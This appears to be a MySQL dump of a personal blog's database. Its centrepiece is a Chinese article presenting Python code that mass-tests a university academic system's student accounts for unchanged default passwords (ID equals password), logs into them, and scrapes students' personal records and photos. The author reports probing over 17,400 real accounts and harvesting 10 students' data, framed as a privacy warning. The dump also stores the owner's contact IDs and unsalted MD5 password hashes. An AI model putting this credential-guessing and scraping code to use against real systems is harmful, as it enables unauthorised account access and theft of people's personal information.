class=\"pun\">.</span><span class=\"pln\">request</span><span class=\"pun\">(</span><span class=\"str\">\'GET\'</span><span class=\"pun\">,</span><span class=\"pln\"> settings</span><span class=\"pun\">.</span><span class=\"pln\">URL_XJXX</span><span class=\"pun\">,</span><span class=\"pln\"> headers</span><span class=\"pun\">=</span><span class=\"pln\">header</span><span class=\"pun\">)</span></code></li><li class=\"L6\"><code><span class=\"pln\">            text </span><span class=\"pun\">=</span><span class=\"pln\"> response_xjxx</span><span class=\"pun\">.</span><span class=\"pln\">data</span><span class=\"pun\">.</span><span class=\"pln\">decode</span><span class=\"pun\">(</span><span class=\"str\">\'GB2312\'</span><span class=\"pun\">,</span><span class=\"pln\"> </span><span class=\"str\">\'ignore\'</span><span class=\"pun\">)</span></code></li><li class=\"L7\"><code><span class=\"pln\">            </span><span class=\"com\"># 解析页面内容</span></code></li><li class=\"L8\"><code><span class=\"pln\">            selector </span><span class=\"pun\">=</span><span class=\"pln\"> etree</span><span class=\"pun\">.</span><span class=\"pln\">HTML</span><span class=\"pun\">(</span><span class=\"pln\">text</span><span class=\"pun\">)</span></code></li><li class=\"L9\"><code><span class=\"pln\">            text_arr </span><span class=\"pun\">=</span><span class=\"pln\"> selector</span><span class=\"pun\">.</span><span class=\"pln\">xpath</span><span class=\"pun\">(</span><span class=\"str\">\'//td[starts-with(@width,\"275\")]/text()\'</span><span class=\"pun\">)</span></code></li><li class=\"L0\"><code><span class=\"pln\">            </span><span class=\"com\"># 学籍信息</span></code></li><li class=\"L1\"><code><span class=\"pln\">            result </span><span class=\"pun\">=</span><span class=\"pln\"> </span><span class=\"pun\">[]</span></code></li><li class=\"L2\"><code><span class=\"pln\">            </span><span class=\"kwd\">for</span><span class=\"pln\"> info </span><span class=\"kwd\">in</span><span class=\"pln\"> text_arr</span><span class=\"pun\">:</span></code></li><li class=\"L3\"><code><span class=\"pln\">                result</span><span class=\"pun\">.</span><span class=\"pln\">append</span><span class=\"pun\">(</span><span class=\"pln\">info</span><span class=\"pun\">.</span><span class=\"pln\">strip</span><span class=\"pun\">())</span></code></li><li class=\"L4\"><code><span class=\"pln\">            </span><span class=\"kwd\">self</span><span class=\"pun\">.</span><span class=\"pln\">save_info</span><span class=\"pun\">(</span><span class=\"pln\">result</span><span class=\"pun\">)</span></code></li><li class=\"L5\"><code><span class=\"pln\">        </span><span class=\"com\"># 学籍照片</span></code></li><li class=\"L6\"><code><span class=\"pln\">        </span><span class=\"kwd\">if</span><span class=\"pln\"> </span><span class=\"kwd\">self</span><span class=\"pun\">.</span><span class=\"pln\">mod_get_roll_img</span><span class=\"pun\">:</span></code></li><li class=\"L7\"><code><span class=\"pln\">            response_xjzp </span><span class=\"pun\">=</span><span class=\"pln\"> </span><span class=\"kwd\">self</span><span class=\"pun\">.</span><span class=\"pln\">http</span><span class=\"pun\">.</span><span class=\"pln\">request</span><span class=\"pun\">(</span><span class=\"str\">\'GET\'</span><span class=\"pun\">,</span><span class=\"pln\"> settings</span><span class=\"pun\">.</span><span class=\"pln\">URL_XJZP</span><span class=\"pun\">,</span><span class=\"pln\"> headers</span><span class=\"pun\">=</span><span class=\"pln\">header</span><span class=\"pun\">)</span></code></li><li class=\"L8\"><code><span class=\"pln\">            image </span><span class=\"pun\">=</span><span class=\"pln\"> </span><span class=\"typ\">Image</span><span class=\"pun\">.</span><span class=\"pln\">open</span><span class=\"pun\">(</span><span class=\"typ\">BytesIO</span><span class=\"pun\">(</span><span class=\"pln\">response_xjzp</span><span class=\"pun\">.</span><span class=\"pln\">data</span><span class=\"pun\">))</span></code></li><li class=\"L9\"><code><span class=\"pln\">            setpath </span><span class=\"pun\">=</span><span class=\"pln\"> settings</span><span class=\"pun\">.</span><span class=\"pln\">PATH_IMG_SAVE</span></code></li><li class=\"L0\"><code><span class=\"pln\">            path </span><span class=\"pun\">=</span><span class=\"pln\"> pathlib</span><span class=\"pun\">.</span><span class=\"typ\">Path</span><span class=\"pun\">(</span><span class=\"pln\">setpath</span><span class=\"pun\">)</span></code></li><li class=\"L1\"><code><span class=\"pln\">            </span><span class=\"kwd\">if</span><span class=\"pln\"> </span><span class=\"kwd\">not</span><span class=\"pln\"> path</span><span class=\"pun\">.</span><span class=\"pln\">exists</span><span class=\"pun\">():</span></code></li><li class=\"L2\"><code><span class=\"pln\">                path</span><span class=\"pun\">.</span><span class=\"pln\">mkdir</span><span class=\"pun\">()</span></code></li><li class=\"L3\"><code><span class=\"pln\">            setpath </span><span class=\"pun\">=</span><span class=\"pln\"> setpath </span><span class=\"pun\">+</span><span class=\"pln\"> </span><span class=\"str\">\'/\'</span><span class=\"pln\"> </span><span class=\"pun\">+</span><span class=\"pln\"> stuid </span><span class=\"pun\">+</span><span class=\"pln\"> </span><span class=\"str\">\'.jpg\'</span></code></li><li class=\"L4\"><code><span class=\"pln\">            image</span><span class=\"pun\">.</span><span class=\"pln\">save</span><span class=\"pun\">(</span><span class=\"pln\">setpath</span><span class=\"pun\">)</span></code></li><li class=\"L5\"><code><span class=\"pln\">            </span><span class=\"kwd\">self</span><span class=\"pun\">.</span><span class=\"pln\">logger</span><span class=\"pun\">.</span><span class=\"pln\">info</span><span class=\"pun\">(</span><span class=\"str\">\'保存照片&gt;&gt;&gt;{}\'</span><span class=\"pun\">.</span><span class=\"pln\">format</span><span class=\"pun\">(</span><span class=\"pln\">setpath</span><span class=\"pun\">))</span></code></li><li class=\"L6\"><code></code></li><li class=\"L7\"><code><span class=\"pln\">        </span><span class=\"com\"># 登出</span></code></li><li class=\"L8\"><code><span class=\"pln\">        </span><span class=\"kwd\">self</span><span class=\"pun\">.</span><span class=\"pln\">http</span><span class=\"pun\">.</span><span class=\"pln\">request</span><span class=\"pun\">(</span><span class=\"str\">\'POST\'</span><span class=\"pun\">,</span><span class=\"pln\"> settings</span><span class=\"pun\">.</span><span class=\"pln\">URL_LOGOUT</span><span class=\"pun\">,</span><span class=\"pln\"> headers</span><span class=\"pun\">=</span><span class=\"pln\">header</span><span class=\"pun\">)</span></code></li></ol></pre><p>至此，已经实现了所有信息的获取以及照片的保存。</p>\r\n<p>没改密码的同学们应该看到了，获取个人信息其实很简单，关键在于增强自己保护个人信息的意识。</p>\r\n</div>','## 初衷\r\n**本文旨在提醒同学们及时修改密码，增强保护个人隐私的意识，因此代码中一些关键数据以及校名等信息不会公开！复制粘贴文章中的代码不会爬到任何东西。只是作为学习 Python 爬虫的一点总结而已！**\r\n\r\n作者所在学校的教务系统安全防范措施可谓非常不严密，学生登录甚至不需要图形验证码。每年学生入学之后，学校下发的账号，初始密码不是无规律的，而是和账号完全一致！如果学生不及时修改密码，那么其他人可以轻松登录他的账号。登录后可以看到学生的学籍信息，包括高考报名时照片，家长联系方式等，联系地址甚至详细到几单元几楼几号门，**个人信息泄露情况非常严重！**\r\n\r\n## 结果\r\n先说结果。经过两天连写带调试，终于完成了对全校本科生 17400 多个在网账号的测试，其中有 12600 多个账号使用的还是初始密码。此处隐去校名，统计结果如下：\r\n\r\n| 序号 | 学院 | 年级 | 在网账号 | 可爬账号 | 年级占比 |\r\n| :-: | :-: | :-: | :-: | :-: | :-: |\r\n|1   |本一   |2014   |3157   |1998   |63.29%   |\r\n|2   |本一   |2015   |3328   |2234   |67.13%   |\r\n|3   |本一   |2016   |3641   |3066   |84.21%   |\r\n|4   |本一   |2017   |3497   |3326   |95.11%   |\r\n|5   |本三   |2014   |1759   |303   |17.23%   |\r\n|6   |本三    |2015   |1643   |620   |37.74%   |\r\n|7   |本三    |2016   |1605   |1434   |89.35%   |\r\n|8   |本三    |2017   |1552   |639   |41.17%   |\r\n\r\n**介于初衷，只爬了 10 个账号的信息，以示严重性！**\r\n\r\n![爬到的学籍信息](http://upload-images.jianshu.io/upload_images/7134080-ec8c310143b69f21.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\r\n\r\n## 过程\r\n本人之前做过近 2 年的 Java 相关开发，对 HTTP 协议中常用的知识了解一些，再加上 Python 出了名的简洁易用，因此入门还是比较轻松的。去年有一段时间研究过一阵子 Python，使用的是 Scrapy 框架，所以这一次我也首先想到了 Scrapy。\r\n\r\nScrapy 这种框架适用的情形是：已经获取了需要爬取的页面的一系列 URL ，或者 URL 是成一定规律变化的，不需要登录或者登录一次拿到 Cookie 就可以拿着这个 Cookie 一直用了。但是教务系统完全相反，它需要每次都进行登录，也许 Scrapy 有办法，但也不会太简单，索性自己写。\r\n\r\n这套教务系统虽然安全性不怎么样，但也已是一套成熟的产品了，功能和稳定性上还是很不错的。\r\n\r\n![系统的登录界面](http://upload-images.jianshu.io/upload_images/7134080-286f834fd46caf89.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\r\n\r\n首先使用 Firefox 浏览器的开发者工具查看 HTTP 通信的一些信息：\r\n\r\n![登录请求 ( POST )](http://upload-images.jianshu.io/upload_images/7134080-3ab0ec0d031193cc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\r\n\r\n登录表单通过 POST 请求进行提交，参数是账号和密码，发送的也是明文\r\n\r\n![表单参数](http://upload-images.jianshu.io/upload_images/7134080-986180eedc73180d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\r\n\r\n服务器返回的响应中 Set-Cookie 就相当于给用户下发的令牌，用户下一次请求的时候带上这块令牌，服务器就能认出来这个用户是否刚登录过。这个令牌是有时间限制的，每次请求都会刷新一次时间，如果两次请求之间间隔时间超过设定值，那么服务器就不认识用户了，这次会话就结束了，需要重新登录。\r\n\r\n![登录的响应体](http://upload-images.jianshu.io/upload_images/7134080-d14eaf5437d7dfc4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\r\n\r\n刚开始使用的是 requests ，用 for 循环实现，由于 requests 是同步的，所以效率很低，还会经常卡死。后来改成了协程，用的 gevent + urllib3，效率提升了上百倍。解析 HTML 用的 lxml 的 etree，图片的保存用 PIL 的 Image。\r\n\r\n先引入依赖\r\n```\r\nimport sys\r\nimport logging\r\nimport gevent\r\nimport urllib3\r\nimport pathlib\r\nfrom PIL import Image\r\nfrom io import BytesIO\r\nfrom lxml import etree\r\n```\r\n创建 HTTP 连接池\r\n```\r\nhttp = urllib3.HTTPConnectionPool(\r\n	host=settings.SERVER_HOST,\r\n	port=settings.SERVER_PORT,\r\n	strict=False,\r\n	maxsize=100,\r\n	block=False,\r\n	retries=100,\r\n	timeout=10\r\n)\r\n```\r\n\r\n请求头的一些固定信息可以预先设定好，伪装浏览器\r\n```\r\nheader = {\'Accept\': \'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\',\r\n	\'Accept-Encoding\': \'gzip, deflate\',\r\n	\'Accept-Language\': \'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\',\r\n	\'Cache-Control\': \'max-age=0\',\r\n	\'Connection\': \'Keep-alive\',\r\n	\'Host\': settings.SERVER_HOST,\r\n	\'Upgrade-Insecure-Requests\': \'1\',\r\n	\'User-Agent\': \'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0\'\r\n}\r\n```\r\n登录并验证是否是初始密码\r\n```\r\n# 账号校验器\r\nclass InfoValidate(object):\r\n	def __init__(self):\r\n		self.logger = InfoMain.logger\r\n		self.http = InfoMain.http\r\n		# 有效账号\r\n		self.account_valid = []\r\n		# 可爬账号\r\n		self.account_available = []\r\n\r\n	def validate(self, all_account):\r\n		# 将所有校验过程加入队列\r\n		jobs = [gevent.spawn(self.validate_account, self.http, a) for a in all_account]\r\n		gevent.joinall(jobs, timeout=0)\r\n\r\n	def validate_account(self, http, account):\r\n		# 登录请求参数\r\n		param = {\"zjh\": account, \"mm\": account}\r\n		header = headers.header\r\n		response = http.request(\'POST\', settings.URL_LOGIN, fields=param, headers=header)\r\n		self.logger.info(\'发送请求>>{}\'.format(param))\r\n		self.logger.info(response.status)\r\n		# 响应体解码\r\n		res_text = response.data.decode(\'GB2312\', \'ignore\')\r\n\r\n		if res_text.find(\'密码不正确\') > -1:\r\n			# 密码有误\r\n			self.account_valid.append(account)\r\n		elif not res_text.find(\'证件号不存在\') > -1:\r\n			# 账号可爬\r\n			self.account_available.append(account)\r\n			self.account_valid.append(account)\r\n			self.logger.info(\"账号可用>>>{}\".format(account))\r\n```\r\n至此已经获取了所有初始密码未修改的账号了，下面研究一下，要爬取的学籍信息页的规律\r\n\r\n![学籍信息页](http://upload-images.jianshu.io/upload_images/7134080-974fdb14f78e7210.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\r\n\r\n\r\n![table 的结构](http://upload-images.jianshu.io/upload_images/7134080-ed103827cea8be42.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\r\n\r\n一系列的信息都包裹在 ```<td width = \"275\"></td> ```之间，对应的 xpath 表达式即为 ```//td[starts-with(@width,\"275\")]/text()```\r\n\r\n基于之前对账号的测试，爬取学籍信息\r\n\r\n```\r\n# 信息收集器\r\nclass InfoCollect(object):\r\n	def __init__(self):\r\n		self.logger = InfoMain.logger\r\n		self.http = InfoMain.http\r\n		# 功能模块\r\n		self.mod_get_roll_info = settings.MOD_ROLL_INFO\r\n		self.mod_get_roll_img = settings.MOD_ROLL_IMG\r\n\r\n	def get_info_queue(self, accounts):\r\n		# 将所有信息收集过程加入队列\r\n		jobs = [gevent.spawn(self.get_info, a) for a in accounts]\r\n		gevent.joinall(jobs, timeout=0)\r\n\r\n	def get_info(self, stuid):\r\n		# 登录\r\n		param = {\'zjh\': stuid, \'mm\': stuid}\r\n		response = self.http.request(\'POST\', settings.URL_LOGIN, fields=param)\r\n		# 保存 Cookie\r\n		cookie = response.headers[\'Set-Cookie\'].replace(\'; path=/\', \'\')\r\n		header = headers.header\r\n		header[\'cookie\'] = cookie\r\n		# 学籍信息\r\n		if self.mod_get_roll_info:\r\n			# 带 Cookie 访问学籍信息页\r\n			response_xjxx = self.http.request(\'GET\', settings.URL_XJXX, headers=header)\r\n			text = response_xjxx.data.decode(\'GB2312\', \'ignore\')\r\n			# 解析页面内容\r\n			selector = etree.HTML(text)\r\n			text_arr = selector.xpath(\'//td[starts-with(@width,\"275\")]/text()\')\r\n			# 学籍信息\r\n			result = []\r\n			for info in text_arr:\r\n				result.append(info.strip())\r\n			self.save_info(result)\r\n		# 学籍照片\r\n		if self.mod_get_roll_img:\r\n			response_xjzp = self.http.request(\'GET\', settings.URL_XJZP, headers=header)\r\n			image = Image.open(BytesIO(response_xjzp.data))\r\n			setpath = settings.PATH_IMG_SAVE\r\n			path = pathlib.Path(setpath)\r\n			if not path.exists():\r\n				path.mkdir()\r\n			setpath = setpath + \'/\' + stuid + \'.jpg\'\r\n			image.save(setpath)\r\n			self.logger.info(\'保存照片>>>{}\'.format(setpath))\r\n\r\n		# 登出\r\n		self.http.request(\'POST\', settings.URL_LOGOUT, headers=header)\r\n```\r\n\r\n至此，已经实现了所有信息的获取以及照片的保存。\r\n\r\n没改密码的同学们应该看到了，获取个人信息其实很简单，关键在于增强自己保护个人信息的意识。','2018-02-11 11:43:27','2018-02-11 12:01:51');

/*Table structure for table `comments` */

DROP TABLE IF EXISTS `comments`;

CREATE TABLE `comments` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT COMMENT 'PrimaryKey',
  `article_id` int(11) DEFAULT NULL,
  `user_id` int(11) DEFAULT NULL,
  `comment` text,
  `create_time` date DEFAULT NULL,
  `comment_id` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=11 DEFAULT CHARSET=utf8;

/*Data for the table `comments` */

insert  into `comments`(`id`,`article_id`,`user_id`,`comment`,`create_time`,`comment_id`) values (9,23,30,'奥术大师大','2018-06-06',NULL),(10,23,30,'阿斯顿阿斯顿','2018-06-06',NULL);

/*Table structure for table `resume` */

DROP TABLE IF EXISTS `resume`;

CREATE TABLE `resume` (
  `id` int(12) unsigned NOT NULL AUTO_INCREMENT COMMENT 'PrimaryKey',
  `title` varchar(50) DEFAULT NULL,
  `introduction` text,
  `html_material` text COMMENT '文章 html 内容',
  `md_material` text COMMENT '文章内容',
  `gmt_create` datetime DEFAULT CURRENT_TIMESTAMP,
  `gmt_modified` datetime DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;

/*Data for the table `resume` */

insert  into `resume`(`id`,`title`,`introduction`,`html_material`,`md_material`,`gmt_create`,`gmt_modified`) values (1,'开发者','开发者简历','<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n\r\n<div class=\"markdown-body editormd-preview-container\" previewcontainer=\"true\" style=\"padding: 20px;\">\r\n  <h1 id=\"h1-i-m-james\">\r\n    <a name=\"I’m James\" class=\"reference-link\"/>\r\n    <span class=\"header-link octicon octicon-link\"/>I’m James\r\n  </h1>\r\n  <h2 id=\"h2-u8054u7CFBu65B9u5F0F\">\r\n    <a name=\"联系方式\" class=\"reference-link\"/>\r\n    <span class=\"header-link octicon octicon-link\"/>联系方式\r\n  </h2>\r\n  <ul> \r\n    <li>Email：\r\n      <a href=\"mailto:zhengbaole_1996@163.com\">zhengbaole_1996@163.com</a>\r\n    </li>\r\n    <li>QQ：1146556298</li>\r\n    <li>微信：zbl19961120</li>\r\n  </ul>  \r\n  <h2 id=\"h2-u6280u80FDu6E05u5355\">\r\n    <a name=\"技能清单\" class=\"reference-link\"/>\r\n    <span class=\"header-link octicon octicon-link\"/>技能清单\r\n  </h2>\r\n  <ul> \r\n    <li>后端开发：Spring/SpringBoot/MyBatis/Freemarker</li>\r\n    <li>Web框架：Spring MVC/Spring WebFlux</li>\r\n    <li>前端框架：Vue.js/jQuery/Bootstrap/EasyUI</li>\r\n    <li>数据库相关：MySQL/MSSQL/Redis</li>\r\n    <li>版本管理、文档和自动化部署工具：Git/SVN/Docker/Travis</li>\r\n    <li>日志相关：Log4j/Slf4j</li>\r\n    <li>单元测试：JUnit</li>\r\n    <li>操作系统：Windows/Linux</li>\r\n    <li>服务器:Tomcat/Nginx/Apache</li>\r\n    <li>构建、依赖管理工具：Maven/Gradle</li>\r\n  </ul>  \r\n</div>\r\n','','2018-03-28 16:38:58','2018-06-01 13:24:32');

/*Table structure for table `tag` */

DROP TABLE IF EXISTS `tag`;

CREATE TABLE `tag` (
  `id` int(12) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(30) DEFAULT NULL,
  `gmt_create` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `gmt_modified` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=18 DEFAULT CHARSET=utf8;

/*Data for the table `tag` */

insert  into `tag`(`id`,`name`,`gmt_create`,`gmt_modified`) values (13,'SpringBoot','2017-12-09 15:26:30','2017-12-09 15:26:30'),(14,'MyBatis','2017-12-09 15:26:31','2017-12-09 15:26:31'),(15,'MVC','2017-12-09 15:26:31','2017-12-09 15:26:31'),(16,'AOP','2017-12-09 15:26:31','2017-12-09 15:26:31'),(17,'Servlet','2017-12-09 23:51:56','2017-12-16 15:42:45');

/*Table structure for table `tag_article` */

DROP TABLE IF EXISTS `tag_article`;

CREATE TABLE `tag_article` (
  `id` int(12) NOT NULL AUTO_INCREMENT,
  `tag_id` int(12) NOT NULL COMMENT 'Tag_ID',
  `article_id` int(12) NOT NULL COMMENT 'Article_ID',
  `gmt_create` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `gmt_modified` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`,`tag_id`,`article_id`)
) ENGINE=InnoDB AUTO_INCREMENT=9 DEFAULT CHARSET=utf8;

/*Data for the table `tag_article` */

insert  into `tag_article`(`id`,`tag_id`,`article_id`,`gmt_create`,`gmt_modified`) values (2,13,24,'2017-12-09 15:26:31','2017-12-09 15:26:31'),(3,14,24,'2017-12-09 15:26:31','2017-12-09 15:26:31'),(4,15,24,'2017-12-09 15:26:31','2017-12-09 15:26:31'),(5,16,24,'2017-12-09 15:26:31','2017-12-09 15:26:31'),(6,17,24,'2017-12-09 23:52:12','2017-12-09 23:52:12'),(7,17,23,'2017-12-09 23:54:21','2017-12-09 23:54:21'),(8,13,22,'2017-12-09 23:58:14','2017-12-16 15:43:34');

/*Table structure for table `user` */

DROP TABLE IF EXISTS `user`;

CREATE TABLE `user` (
  `id` int(12) unsigned NOT NULL AUTO_INCREMENT COMMENT 'PrimaryKey',
  `username` varchar(20) NOT NULL COMMENT '用户名',
  `password` varchar(50) NOT NULL,
  `birth_date` date DEFAULT NULL,
  `nickname` varchar(20) DEFAULT NULL,
  `email` varchar(40) DEFAULT NULL,
  `github` varchar(40) DEFAULT NULL,
  `qq` varchar(15) DEFAULT NULL,
  `wecaht` varchar(20) DEFAULT NULL,
  `hobby` text,
  `motto` text,
  `md_info` text,
  `avatar` varchar(255) DEFAULT NULL COMMENT '头像url',
  `status` int(3) NOT NULL DEFAULT '0' COMMENT '状态/0:正常/1:封禁',
  `level` int(2) NOT NULL DEFAULT '0' COMMENT '等级',
  `gmt_create` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `gmt_modified` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=31 DEFAULT CHARSET=utf8;

/*Data for the table `user` */

insert  into `user`(`id`,`username`,`password`,`birth_date`,`nickname`,`email`,`github`,`qq`,`wecaht`,`hobby`,`motto`,`md_info`,`avatar`,`status`,`level`,`gmt_create`,`gmt_modified`) values (23,'ZBL','4d8812dbb1bc41c2d4af4a9967bff7a7',NULL,'ZBL',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,0,'2017-12-06 18:48:37','2017-12-08 23:54:00'),(25,'18333298410','5b3ea3a80775c95c608cd3c220f2a754',NULL,'18333298410',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,0,'2017-12-09 00:06:36','2017-12-16 15:43:53'),(30,'quan','c4ca4238a0b923820dcc509a6f75849b',NULL,'quan',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,0,'2018-06-01 16:18:13','2018-06-01 16:18:13');

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;
